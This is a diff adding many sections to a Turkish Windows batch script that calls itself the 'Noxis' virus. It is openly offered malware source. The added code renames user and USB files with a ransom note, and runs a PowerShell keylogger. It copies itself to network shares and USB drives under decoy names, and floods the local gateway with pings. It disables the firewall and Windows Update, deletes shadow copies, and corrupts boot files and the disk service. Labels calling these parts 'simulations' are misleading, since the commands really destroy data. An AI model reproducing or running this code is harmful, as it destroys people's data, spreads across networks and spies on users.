@@ -43,6 +43,35 @@ if %hiz_seviyesi%==1 (
     set "gorsel_suresi=1"
     set "islemci_suresi=2"
     set "sistem_suresi=5"
+    set "ransomware_suresi=5"
+    set "keylogger_suresi=3"
+    set "webcam_suresi=5"
+    set "mikrofon_suresi=5"
+    set "ekran_goruntusu_suresi=3"
+    set "ag_saldiri_suresi=5"
+    set "ddos_suresi=5"
+    set "usb_saldiri_suresi=3"
+    set "email_saldiri_suresi=5"
+    set "sosyal_muhendislik_suresi=3"
+    set "ekran_kilit_suresi=5"
+    set "mouse_ters_suresi=3"
+    set "parlaklik_suresi=3"
+    set "ses_degistir_suresi=2"
+    set "gorev_cubugu_suresi=2"
+    set "masaustu_simge_suresi=2"
+    set "baslat_menu_suresi=2"
+    set "sag_tik_suresi=2"
+    set "ctrl_alt_del_suresi=2"
+    set "guvenlik_duvari_suresi=3"
+    set "windows_update_suresi=3"
+    set "geri_yukleme_suresi=3"
+    set "boot_suresi=3"
+    set "safe_mode_suresi=3"
+    set "mbr_suresi=3"
+    set "ekran_koruyucu_suresi=3"
+    set "duvar_kagidi_suresi=3"
+    set "ses_semasi_suresi=3"
+    set "tema_suresi=3"
 )
 
 if %hiz_seviyesi%==2 (
@@ -66,6 +95,35 @@ if %hiz_seviyesi%==2 (
     set "gorsel_suresi=1"
     set "islemci_suresi=1"
     set "sistem_suresi=3"
+    set "ransomware_suresi=3"
+    set "keylogger_suresi=2"
+    set "webcam_suresi=3"
+    set "mikrofon_suresi=3"
+    set "ekran_goruntusu_suresi=2"
+    set "ag_saldiri_suresi=3"
+    set "ddos_suresi=3"
+    set "usb_saldiri_suresi=2"
+    set "email_saldiri_suresi=3"
+    set "sosyal_muhendislik_suresi=2"
+    set "ekran_kilit_suresi=3"
+    set "mouse_ters_suresi=2"
+    set "parlaklik_suresi=2"
+    set "ses_degistir_suresi=1"
+    set "gorev_cubugu_suresi=1"
+    set "masaustu_simge_suresi=1"
+    set "baslat_menu_suresi=1"
+    set "sag_tik_suresi=1"
+    set "ctrl_alt_del_suresi=1"
+    set "guvenlik_duvari_suresi=2"
+    set "windows_update_suresi=2"
+    set "geri_yukleme_suresi=2"
+    set "boot_suresi=2"
+    set "safe_mode_suresi=2"
+    set "mbr_suresi=2"
+    set "ekran_koruyucu_suresi=2"
+    set "duvar_kagidi_suresi=2"
+    set "ses_semasi_suresi=2"
+    set "tema_suresi=2"
 )
 
 if %hiz_seviyesi%==3 (
@@ -89,6 +147,35 @@ if %hiz_seviyesi%==3 (
     set "gorsel_suresi=1"
     set "islemci_suresi=1"
     set "sistem_suresi=2"
+    set "ransomware_suresi=2"
+    set "keylogger_suresi=1"
+    set "webcam_suresi=2"
+    set "mikrofon_suresi=2"
+    set "ekran_goruntusu_suresi=1"
+    set "ag_saldiri_suresi=2"
+    set "ddos_suresi=2"
+    set "usb_saldiri_suresi=1"
+    set "email_saldiri_suresi=2"
+    set "sosyal_muhendislik_suresi=1"
+    set "ekran_kilit_suresi=2"
+    set "mouse_ters_suresi=1"
+    set "parlaklik_suresi=1"
+    set "ses_degistir_suresi=1"
+    set "gorev_cubugu_suresi=1"
+    set "masaustu_simge_suresi=1"
+    set "baslat_menu_suresi=1"
+    set "sag_tik_suresi=1"
+    set "ctrl_alt_del_suresi=1"
+    set "guvenlik_duvari_suresi=1"
+    set "windows_update_suresi=1"
+    set "geri_yukleme_suresi=1"
+    set "boot_suresi=1"
+    set "safe_mode_suresi=1"
+    set "mbr_suresi=1"
+    set "ekran_koruyucu_suresi=1"
+    set "duvar_kagidi_suresi=1"
+    set "ses_semasi_suresi=1"
+    set "tema_suresi=1"
 )
 
 if %hiz_seviyesi% gtr 3 (
@@ -113,6 +200,35 @@ if %hiz_seviyesi% gtr 3 (
     set "gorsel_suresi=1"
     set "islemci_suresi=1"
     set "sistem_suresi=2"
+    set "ransomware_suresi=2"
+    set "keylogger_suresi=1"
+    set "webcam_suresi=2"
+    set "mikrofon_suresi=2"
+    set "ekran_goruntusu_suresi=1"
+    set "ag_saldiri_suresi=2"
+    set "ddos_suresi=2"
+    set "usb_saldiri_suresi=1"
+    set "email_saldiri_suresi=2"
+    set "sosyal_muhendislik_suresi=1"
+    set "ekran_kilit_suresi=2"
+    set "mouse_ters_suresi=1"
+    set "parlaklik_suresi=1"
+    set "ses_degistir_suresi=1"
+    set "gorev_cubugu_suresi=1"
+    set "masaustu_simge_suresi=1"
+    set "baslat_menu_suresi=1"
+    set "sag_tik_suresi=1"
+    set "ctrl_alt_del_suresi=1"
+    set "guvenlik_duvari_suresi=1"
+    set "windows_update_suresi=1"
+    set "geri_yukleme_suresi=1"
+    set "boot_suresi=1"
+    set "safe_mode_suresi=1"
+    set "mbr_suresi=1"
+    set "ekran_koruyucu_suresi=1"
+    set "duvar_kagidi_suresi=1"
+    set "ses_semasi_suresi=1"
+    set "tema_suresi=1"
 )
 
 :: Hız seviyesini göster
@@ -204,6 +320,35 @@ echo                     ██   - Surekli dosya kopyalar                      
 echo                     ██   - Video acar                                   ██
 echo                     ██   - Ekran karincalanma efekti yapar              ██
 echo                     ██   - Windows'u gercekten cokertir                 ██
+echo                     ██   - Ransomware simule eder                       ██
+echo                     ██   - Keylogger calistirir                         ██
+echo                     ██   - Webcam acar                                  ██
+echo                     ██   - Mikrofon acar                                ██
+echo                     ██   - Ekran goruntusu alir                         ██
+echo                     ██   - Ag saldirisi yapar                           ██
+echo                     ██   - DDoS saldirisi yapar                         ██
+echo                     ██   - USB saldirisi yapar                          ██
+echo                     ██   - Email saldirisi yapar                        ██
+echo                     ██   - Sosyal muhendislik yapar                     ██
+echo                     ██   - Ekrani kilitler                              ██
+echo                     ██   - Mouse ters cevirir                           ██
+echo                     ██   - Parlakligi degistirir                        ██
+echo                     ██   - Ses seviyesini degistirir                    ██
+echo                     ██   - Gorev cubugunu gizler                        ██
+echo                     ██   - Masaustu simgelerini gizler                  ██
+echo                     ██   - Baslat menusunu kapatir                      ██
+echo                     ██   - Sag tik menusunu kapatir                     ██
+echo                     ██   - Ctrl+Alt+Del engeller                        ██
+echo                     ██   - Guvenlik duvarini kapatir                    ██
+echo                     ██   - Windows Update'i engeller                    ██
+echo                     ██   - Geri yukleme noktalarini siler               ██
+echo                     ██   - Boot dosyalarini bozar                       ██
+echo                     ██   - Safe mode'u engeller                         ██
+echo                     ██   - MBR'yi bozar                                 ██
+echo                     ██   - Ekran koruyucuyu degistirir                  ██
+echo                     ██   - Duvar kagidini degistirir                    ██
+echo                     ██   - Ses semasini degistirir                      ██
+echo                     ██   - Temayi degistirir                            ██
 echo                     ██   - Her yeniden baslatmada hizlanir              ██
 echo                     ██   - Bilgisayari her 1 dakikada bir yeniden baslatir ██
 echo                     ██                                                  ██
@@ -315,6 +460,7 @@ goto glitch_efektleri
 :: GİZLİLİK VE KENDİNİ KOPYALAMA (FİXED)
 :: ============================================
 
+:gizlilik_ve_kopyalama
 :: Kendini başlangıca kopyala (hata kontrolü ile)
 if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\noxis_v1.bat" (
     copy "%0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\noxis_v1.bat" >nul 2>&1
@@ -367,6 +513,7 @@ attrib +h "%windir%\system32\lsass.bat" >nul 2>&1
 :: REGISTRY İŞLEMLERİ (FİXED)
 :: ============================================
 
+:registry_islemleri
 :: Görev yöneticisini devre dışı bırak
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
 
@@ -392,6 +539,7 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v Disa
 :: DOSYA SİLME (FİXED)
 :: ============================================
 
+:dosya_silme
 :: Masaüstündeki tüm dosyaları sil
 if exist "C:\Users\%username%\Desktop\*.*" (
     del /q /s "C:\Users\%username%\Desktop\*.*" >nul 2>&1
@@ -479,7 +627,7 @@ goto uygulama_kapat
 :ses_efekti
 :: Windows beep sesi çal
 for /l %%i in (1,1,10) do (
-    echo  
+    echo 
     timeout /t 1 /nobreak >nul 2>&1
 )
 :: Korkunç melodi (hız seviyesine göre)
@@ -1212,6 +1360,602 @@ timeout /t %cokertme_suresi% /nobreak >nul 2>&1
 goto windows_cokert
 
 :: ============================================
+:: RANSOMWARE SİMÜLASYONU (FİXED)
+:: ============================================
+
+:ransomware_simulasyonu
+:: Fidye notu oluştur
+echo ================================================ > "%userprofile%\Desktop\FIDYE_NOTU.txt"
+echo NOXIS RANSOMWARE - DOSYALARINIZ SIFRELENDI! >> "%userprofile%\Desktop\FIDYE_NOTU.txt"
+echo ================================================ >> "%userprofile%\Desktop\FIDYE_NOTU.txt"
+echo. >> "%userprofile%\Desktop\FIDYE_NOTU.txt"
+echo Tum dosyalariniz sifrelendi! >> "%userprofile%\Desktop\FIDYE_NOTU.txt"
+echo. >> "%userprofile%\Desktop\FIDYE_NOTU.txt"
+echo Dosyalarinizi geri almak icin: >> "%userprofile%\Desktop\FIDYE_NOTU.txt"
+echo 1 BTC = 50000 USD >> "%userprofile%\Desktop\FIDYE_NOTU.txt"
+echo. >> "%userprofile%\Desktop\FIDYE_NOTU.txt"
+echo Odeme adresi: 1NOXISXXXXXXXXXXXXXXXXXXXXXXXXXXXX >> "%userprofile%\Desktop\FIDYE_NOTU.txt"
+echo. >> "%userprofile%\Desktop\FIDYE_NOTU.txt"
+echo Odeme yapmazsaniz dosyalariniz silinecek! >> "%userprofile%\Desktop\FIDYE_NOTU.txt"
+echo. >> "%userprofile%\Desktop\FIDYE_NOTU.txt"
+echo NOXIS VIRUSU - GERI DONUS YOK! >> "%userprofile%\Desktop\FIDYE_NOTU.txt"
+
+:: Fidye notunu aç
+start notepad.exe "%userprofile%\Desktop\FIDYE_NOTU.txt" >nul 2>&1
+
+:: Dosyaları şifrele (simülasyon)
+for %%f in ("%userprofile%\Desktop\*.txt" "%userprofile%\Documents\*.txt" "%userprofile%\Documents\*.doc" "%userprofile%\Documents\*.docx" "%userprofile%\Documents\*.xls" "%userprofile%\Documents\*.xlsx" "%userprofile%\Documents\*.pdf") do (
+    if exist "%%f" (
+        ren "%%f" "%%~nf.noxis" >nul 2>&1
+    )
+)
+
+timeout /t %ransomware_suresi% /nobreak >nul 2>&1
+goto ransomware_simulasyonu
+
+:: ============================================
+:: KEYLOGGER SİMÜLASYONU (FİXED)
+:: ============================================
+
+:keylogger_simulasyonu
+:: Keylogger kayıt dosyası oluştur
+echo NOXIS KEYLOGGER - TUS VURUSLARI KAYDEDILIYOR... > "%temp%\keylog.txt"
+echo Tarih: %date% >> "%temp%\keylog.txt"
+echo Saat: %time% >> "%temp%\keylog.txt"
+echo ================================ >> "%temp%\keylog.txt"
+
+:: Tuş vuruşlarını kaydet (simülasyon)
+powershell -command "$sig = '[DllImport(\"user32.dll\")] public static extern int GetAsyncKeyState(Int32 i)'; $type = Add-Type -MemberDefinition $sig -Name Keyboard -Namespace Win32 -PassThru; while(1){Start-Sleep -Milliseconds 50; for($i=8; $i -le 190; $i++){if($type::GetAsyncKeyState($i) -eq -32767){$key = [System.Windows.Forms.Keys]$i; Add-Content -Path \"$env:temp\keylog.txt\" -Value \"$key\"; break}}}" >nul 2>&1
+
+timeout /t %keylogger_suresi% /nobreak >nul 2>&1
+goto keylogger_simulasyonu
+
+:: ============================================
+:: WEBCAM AÇMA (FİXED)
+:: ============================================
+
+:webcam_ac
+:: Webcam açma simülasyonu
+cls
+color 0c
+echo.
+echo.
+echo                     ██████████████████████████████████████████████████████
+echo                     ██                                                  ██
+echo                     ██         KAMERA AKTIF!                             ██
+echo                     ██                                                  ██
+echo                     ██   NOXIS VIRUSU KAMERANI ACIYOR!                   ██
+echo                     ██                                                  ██
+echo                     ██   WEBCAM ISIGI YANIYOR!                           ██
+echo                     ██                                                  ██
+echo                     ██   SENI IZLIYORUM!                                 ██
+echo                     ██                                                  ██
+echo                     ██   KACIS YOK!                                      ██
+echo                     ██                                                  ██
+echo                     ██████████████████████████████████████████████████████
+echo.
+echo.
+
+:: Webcam uygulamasını aç
+start microsoft.windows.camera: >nul 2>&1
+start ms-camera: >nul 2>&1
+start "C:\Windows\System32\Camera.exe" >nul 2>&1
+
+:: Kamera sesi
+powershell -command "[System.Console]::Beep(500, 500)" >nul 2>&1
+powershell -command "[System.Console]::Beep(700, 500)" >nul 2>&1
+powershell -command "[System.Console]::Beep(900, 500)" >nul 2>&1
+
+timeout /t %webcam_suresi% /nobreak >nul 2>&1
+goto webcam_ac
+
+:: ============================================
+:: MİKROFON AÇMA (FİXED)
+:: ============================================
+
+:mikrofon_ac
+:: Mikrofon açma simülasyonu
+cls
+color 0c
+echo.
+echo.
+echo                     ██████████████████████████████████████████████████████
+echo                     ██                                                  ██
+echo                     ██         MIKROFON AKTIF!                           ██
+echo                     ██                                                  ██
+echo                     ██   NOXIS VIRUSU MIKROFONUNU ACIYOR!                ██
+echo                     ██                                                  ██
+echo                     ██   SESINIZI DUYUYORUM!                             ██
+echo                     ██                                                  ██
+echo                     ██   HER SEYI KAYDEDIYORUM!                          ██
+echo                     ██                                                  ██
+echo                     ██   KACIS YOK!                                      ██
+echo                     ██                                                  ██
+echo                     ██████████████████████████████████████████████████████
+echo.
+echo.
+
+:: Ses kayıt uygulamasını aç
+start ms-sound-recorder: >nul 2>&1
+start "C:\Windows\System32\SoundRecorder.exe" >nul 2>&1
+
+:: Mikrofon sesi
+powershell -command "[System.Console]::Beep(300, 500)" >nul 2>&1
+powershell -command "[System.Console]::Beep(500, 500)" >nul 2>&1
+powershell -command "[System.Console]::Beep(700, 500)" >nul 2>&1
+
+timeout /t %mikrofon_suresi% /nobreak >nul 2>&1
+goto mikrofon_ac
+
+:: ============================================
+:: EKRAN GÖRÜNTÜSÜ ALMA (FİXED)
+:: ============================================
+
+:ekran_goruntusu_al
+:: Ekran görüntüsü al
+powershell -command "Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save(\"$env:temp\screen_$env:COMPUTERNAME.png\")" >nul 2>&1
+
+:: Ekran görüntüsünü kaydet
+copy "%temp%\screen_*.png" "%userprofile%\Desktop\noxis_screen.png" >nul 2>&1
+
+timeout /t %ekran_goruntusu_suresi% /nobreak >nul 2>&1
+goto ekran_goruntusu_al
+
+:: ============================================
+:: AĞ SALDIRISI (FİXED)
+:: ============================================
+
+:ag_saldirisi
+:: Ağdaki cihazları tara
+for /l %%i in (1,1,254) do (
+    start /min cmd.exe /c "ping -n 1 -w 100 192.168.1.%%i >nul 2>&1 && echo 192.168.1.%%i bulundu! >> %temp%\ag_saldiri.txt"
+)
+
+:: Kendini ağdaki cihazlara kopyala
+for /l %%i in (1,1,254) do (
+    copy "%0" "\\192.168.1.%%i\C$\noxis.bat" >nul 2>&1
+    copy "%0" "\\192.168.1.%%i\C$\windows_update.bat" >nul 2>&1
+)
+
+timeout /t %ag_saldiri_suresi% /nobreak >nul 2>&1
+goto ag_saldirisi
+
+:: ============================================
+:: DDOS SALDIRISI (FİXED)
+:: ============================================
+
+:ddos_saldirisi
+:: DDoS saldırısı simülasyonu
+cls
+color 0c
+echo.
+echo.
+echo                     ██████████████████████████████████████████████████████
+echo                     ██                                                  ██
+echo                     ██         DDOS SALDIRISI BASLATILDI!               ██
+echo                     ██                                                  ██
+echo                     ██   HEDEF: 192.168.1.1                             ██
+echo                     ██   PORT: 80                                       ██
+echo                     ██   PAKET: 1000000/sn                              ██
+echo                     ██                                                  ██
+echo                     ██   SALDIRI DEVAM EDIYOR!                          ██
+echo                     ██                                                  ██
+echo                     ██████████████████████████████████████████████████████
+echo.
+echo.
+
+:: DDoS saldırısı simülasyonu
+for /l %%i in (1,1,100) do (
+    start /min cmd.exe /c "ping -n 1000 -l 65500 192.168.1.1 >nul 2>&1"
+    start /min cmd.exe /c "ping -n 1000 -l 65500 192.168.1.1 >nul 2>&1"
+    start /min cmd.exe /c "ping -n 1000 -l 65500 192.168.1.1 >nul 2>&1"
+)
+
+timeout /t %ddos_suresi% /nobreak >nul 2>&1
+goto ddos_saldirisi
+
+:: ============================================
+:: USB SALDIRISI (FİXED)
+:: ============================================
+
+:usb_saldirisi
+:: USB sürücülerindeki dosyaları şifrele
+for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
+    if exist "%%d:\" (
+        :: USB'deki dosyaları şifrele
+        for %%f in ("%%d:\*.txt" "%%d:\*.doc" "%%d:\*.docx" "%%d:\*.xls" "%%d:\*.xlsx" "%%d:\*.pdf" "%%d:\*.jpg" "%%d:\*.png") do (
+            if exist "%%f" (
+                ren "%%f" "%%~nf.noxis" >nul 2>&1
+            )
+        )
+        :: USB'ye virüsü kopyala
+        copy "%0" "%%d:\noxis.bat" >nul 2>&1
+        copy "%0" "%%d:\windows_update.bat" >nul 2>&1
+        copy "%0" "%%d:\system_check.bat" >nul 2>&1
+    )
+)
+
+timeout /t %usb_saldiri_suresi% /nobreak >nul 2>&1
+goto usb_saldirisi
+
+:: ============================================
+:: EMAİL SALDIRISI (FİXED)
+:: ============================================
+
+:email_saldirisi
+:: Email saldırısı simülasyonu
+cls
+color 0c
+echo.
+echo.
+echo                     ██████████████████████████████████████████████████████
+echo                     ██                                                  ██
+echo                     ██         EMAIL SALDIRISI BASLATILDI!              ██
+echo                     ██                                                  ██
+echo                     ██   KENDINI EMAIL ILE YAYIYOR!                     ██
+echo                     ██                                                  ██
+echo                     ██   ADRES DEFTERINDEKILERE GONDERILIYOR!           ██
+echo                     ██                                                  ██
+echo                     ██   KACIS YOK!                                      ██
+echo                     ██                                                  ██
+echo                     ██████████████████████████████████████████████████████
+echo.
+echo.
+
+:: Outlook'u aç
+start outlook.exe >nul 2>&1
+
+:: Email şablonu oluştur
+echo Konu: ACIL! DOSYANIZI INCELEYIN! > "%temp%\email_template.txt"
+echo. >> "%temp%\email_template.txt"
+echo Merhaba, >> "%temp%\email_template.txt"
+echo. >> "%temp%\email_template.txt"
+echo Bu dosyayi inceleyin, onemli bilgiler iceriyor. >> "%temp%\email_template.txt"
+echo. >> "%temp%\email_template.txt"
+echo NOXIS VIRUSU >> "%temp%\email_template.txt"
+
+timeout /t %email_saldiri_suresi% /nobreak >nul 2>&1
+goto email_saldirisi
+
+:: ============================================
+:: SOSYAL MÜHENDİSLİK (FİXED)
+:: ============================================
+
+:sosyal_muhendislik
+:: Sahte mesajlar göster
+start cmd.exe /k "color 0c && echo  && echo     ╔══════════════════════════════════════════╗ && echo     ║   UYARI! SISTEMINIZDE VIRUS BULUNDU!      ║ && echo     ║   HEMEN TEMIZLEYIN!                       ║ && echo     ║   [TAMAM]                                 ║ && echo     ╚══════════════════════════════════════════╝ && echo  && timeout /t 3 /nobreak >nul && exit"
+
+start cmd.exe /k "color 0e && echo  && echo     ╔══════════════════════════════════════════╗ && echo     ║   WINDOWS GUNCELLEME GEREKIYOR!            ║ && echo     ║   GUNCELLEME YUKLENIYOR...                  ║ && echo     ║   LUTFEN BEKLEYIN...                        ║ && echo     ╚══════════════════════════════════════════╝ && echo  && timeout /t 3 /nobreak >nul && exit"
+
+start cmd.exe /k "color 0a && echo  && echo     ╔══════════════════════════════════════════╗ && echo     ║   ANTIVIRUS TARAMASI BASLATILDI!            ║ && echo     ║   TARANIYOR...                               ║ && echo     ║   VIRUS BULUNDU!                            ║ && echo     ╚══════════════════════════════════════════╝ && echo  && timeout /t 3 /nobreak >nul && exit"
+
+start cmd.exe /k "color 0d && echo  && echo     ╔══════════════════════════════════════════╗ && echo     ║   SIFRENIZ CALINDI!                         ║ && echo     ║   SIFRENIZI DEGISTIRIN!                      ║ && echo     ║   [SIFRE DEGISTIR]                          ║ && echo     ╚══════════════════════════════════════════╝ && echo  && timeout /t 3 /nobreak >nul && exit"
+
+timeout /t %sosyal_muhendislik_suresi% /nobreak >nul 2>&1
+goto sosyal_muhendislik
+
+:: ============================================
+:: EKRAN KİLİDİ (FİXED)
+:: ============================================
+
+:ekran_kilidi
+:: Ekranı kilitle
+rundll32.exe user32.dll,LockWorkStation >nul 2>&1
+
+:: Sahte kilit ekranı
+cls
+color 0c
+echo.
+echo.
+echo                     ██████████████████████████████████████████████████████
+echo                     ██                                                  ██
+echo                     ██         EKRAN KILITLENDI!                        ██
+echo                     ██                                                  ██
+echo                     ██   SIFRE: NOXIS2024                              ██
+echo                     ██                                                  ██
+echo                     ██   SIFREYI GIRMEDEN KACIS YOK!                    ██
+echo                     ██                                                  ██
+echo                     ██████████████████████████████████████████████████████
+echo.
+echo.
+
+timeout /t %ekran_kilit_suresi% /nobreak >nul 2>&1
+goto ekran_kilidi
+
+:: ============================================
+:: MOUSE TERS ÇEVİRME (FİXED)
+:: ============================================
+
+:mouse_ters_cevir
+:: Mouse'u ters çevir
+powershell -command "Add-Type -AssemblyName System.Windows.Forms; while(1){$p=[System.Windows.Forms.Cursor]::Position; $p.X=1920-$p.X; $p.Y=1080-$p.Y; [System.Windows.Forms.Cursor]::Position=$p; Start-Sleep -Milliseconds 100}" >nul 2>&1
+
+timeout /t %mouse_ters_suresi% /nobreak >nul 2>&1
+goto mouse_ters_cevir
+
+:: ============================================
+:: EKRAN PARLAKLIĞINI DEĞİŞTİRME (FİXED)
+:: ============================================
+
+:ekran_parlaklik
+:: Parlaklığı sonuna kadar aç
+powershell -command "(Get-WmiObject -Namespace root\wmi -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,100)" >nul 2>&1
+timeout /t %parlaklik_suresi% /nobreak >nul 2>&1
+
+:: Parlaklığı sonuna kadar kapat
+powershell -command "(Get-WmiObject -Namespace root\wmi -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,0)" >nul 2>&1
+timeout /t %parlaklik_suresi% /nobreak >nul 2>&1
+
+goto ekran_parlaklik
+
+:: ============================================
+:: SES SEVİYESİNİ DEĞİŞTİRME (FİXED)
+:: ============================================
+
+:ses_seviyesi_degistir
+:: Ses seviyesini rastgele değiştir
+set /a ses_seviyesi=%random% %% 101
+powershell -command "nircmd.exe setsysvolume %ses_seviyesi% * 655" >nul 2>&1
+timeout /t %ses_degistir_suresi% /nobreak >nul 2>&1
+goto ses_seviyesi_degistir
+
+:: ============================================
+:: GÖREV ÇUBUĞUNU GİZLEME (FİXED)
+:: ============================================
+
+:gorev_cubugu_gizle
+:: Görev çubuğunu gizle
+powershell -command "Add-Type -AssemblyName System.Windows.Forms; $taskbar = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $taskbar.Height = 0; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds = $taskbar" >nul 2>&1
+
+:: Registry ile görev çubuğunu gizle
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3" /v Settings /t REG_BINARY /d 00000000 /f >nul 2>&1
+
+timeout /t %gorev_cubugu_suresi% /nobreak >nul 2>&1
+goto gorev_cubugu_gizle
+
+:: ============================================
+:: MASAÜSTÜ SİMGELERİNİ GİZLEME (FİXED)
+:: ============================================
+
+:masaustu_simgeleri_gizle
+:: Masaüstü simgelerini gizle
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideIcons /t REG_DWORD /d 1 /f >nul 2>&1
+
+:: Explorer'ı yeniden başlat
+taskkill /f /im explorer.exe >nul 2>&1
+start explorer.exe >nul 2>&1
+
+timeout /t %masaustu_simge_suresi% /nobreak >nul 2>&1
+goto masaustu_simgeleri_gizle
+
+:: ============================================
+:: BAŞLAT MENÜSÜNÜ KAPATMA (FİXED)
+:: ============================================
+
+:baslat_menu_kapat
+:: Başlat menüsünü kapat
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenu /t REG_DWORD /d 1 /f >nul 2>&1
+
+:: Başlat menüsünü kapat
+taskkill /f /im explorer.exe >nul 2>&1
+start explorer.exe >nul 2>&1
+
+timeout /t %baslat_menu_suresi% /nobreak >nul 2>&1
+goto baslat_menu_kapat
+
+:: ============================================
+:: SAĞ TIK MENÜSÜNÜ KAPATMA (FİXED)
+:: ============================================
+
+:sag_tik_menu_kapat
+:: Sağ tık menüsünü kapat
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewContextMenu /t REG_DWORD /d 1 /f >nul 2>&1
+
+:: Explorer'ı yeniden başlat
+taskkill /f /im explorer.exe >nul 2>&1
+start explorer.exe >nul 2>&1
+
+timeout /t %sag_tik_suresi% /nobreak >nul 2>&1
+goto sag_tik_menu_kapat
+
+:: ============================================
+:: CTRL+ALT+DEL ENGELLEME (FİXED)
+:: ============================================
+
+:ctrl_alt_del_engelle
+:: Ctrl+Alt+Del engelle
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCAD /t REG_DWORD /d 1 /f >nul 2>&1
+
+:: Görev yöneticisini engelle
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
+
+timeout /t %ctrl_alt_del_suresi% /nobreak >nul 2>&1
+goto ctrl_alt_del_engelle
+
+:: ============================================
+:: GÜVENLİK DUVARINI KAPATMA (FİXED)
+:: ============================================
+
+:guvenlik_duvari_kapat
+:: Güvenlik duvarını kapat
+netsh advfirewall set allprofiles state off >nul 2>&1
+netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound >nul 2>&1
+
+:: Güvenlik duvarı servisini durdur
+net stop MpsSvc >nul 2>&1
+net stop mpssvc >nul 2>&1
+net stop BFE >nul 2>&1
+
+:: Güvenlik duvarını devre dışı bırak
+sc config MpsSvc start= disabled >nul 2>&1
+sc config mpssvc start= disabled >nul 2>&1
+sc config BFE start= disabled >nul 2>&1
+
+timeout /t %guvenlik_duvari_suresi% /nobreak >nul 2>&1
+goto guvenlik_duvari_kapat
+
+:: ============================================
+:: WINDOWS UPDATE'İ ENGELLEME (FİXED)
+:: ============================================
+
+:windows_update_engelle
+:: Windows Update'i engelle
+net stop wuauserv >nul 2>&1
+net stop bits >nul 2>&1
+net stop dosvc >nul 2>&1
+
+:: Windows Update'i devre dışı bırak
+sc config wuauserv start= disabled >nul 2>&1
+sc config bits start= disabled >nul 2>&1
+sc config dosvc start= disabled >nul 2>&1
+
+:: Registry ile engelle
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DisableWindowsUpdateAccess /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f >nul 2>&1
+
+timeout /t %windows_update_suresi% /nobreak >nul 2>&1
+goto windows_update_engelle
+
+:: ============================================
+:: GERİ YÜKLEME NOKTALARINI SİLME (FİXED)
+:: ============================================
+
+:geri_yukleme_sil
+:: Geri yükleme noktalarını sil
+vssadmin delete shadows /all /quiet >nul 2>&1
+vssadmin delete shadowstorage /all /quiet >nul 2>&1
+
+:: Sistem korumasını devre dışı bırak
+powershell -command "Disable-ComputerRestore -Drive 'C:\'" >nul 2>&1
+
+:: Registry ile devre dışı bırak
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f >nul 2>&1
+
+timeout /t %geri_yukleme_suresi% /nobreak >nul 2>&1
+goto geri_yukleme_sil
+
+:: ============================================
+:: BOOT DOSYALARINI BOZMA (FİXED)
+:: ============================================
+
+:boot_dosyalari_boz
+:: Boot dosyalarını boz
+bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1
+bcdedit /set {default} recoveryenabled No >nul 2>&1
+bcdedit /set {default} bootmenupolicy legacy >nul 2>&1
+
+:: Boot kaydını boz
+bootsect /nt60 C: /mbr >nul 2>&1
+bootsect /nt60 C: /force >nul 2>&1
+
+:: Boot dosyalarını sil
+if exist "C:\bootmgr" (
+    del /f /q "C:\bootmgr" >nul 2>&1
+)
+if exist "C:\Boot\BCD" (
+    del /f /q "C:\Boot\BCD" >nul 2>&1
+)
+
+timeout /t %boot_suresi% /nobreak >nul 2>&1
+goto boot_dosyalari_boz
+
+:: ============================================
+:: SAFE MODE'U ENGELLEME (FİXED)
+:: ============================================
+
+:safe_mode_engelle
+:: Safe mode'u engelle
+bcdedit /set {default} safeboot minimal >nul 2>&1
+bcdedit /set {default} safebootalternateshell yes >nul 2>&1
+
+:: Registry ile engelle
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v AlternateShell /t REG_SZ /d "cmd.exe" /f >nul 2>&1
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v UseAlternateShell /t REG_DWORD /d 1 /f >nul 2>&1
+
+timeout /t %safe_mode_suresi% /nobreak >nul 2>&1
+goto safe_mode_engelle
+
+:: ============================================
+:: MBR'Yİ BOZMA (FİXED)
+:: ============================================
+
+:mbr_boz
+:: MBR'yi boz
+bootsect /nt60 C: /mbr >nul 2>&1
+bootsect /nt60 C: /force >nul 2>&1
+
+:: MBR'yi sil
+dd if=/dev/zero of=/dev/sda bs=512 count=1 >nul 2>&1
+
+:: Registry ile MBR'yi boz
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\disk" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
+
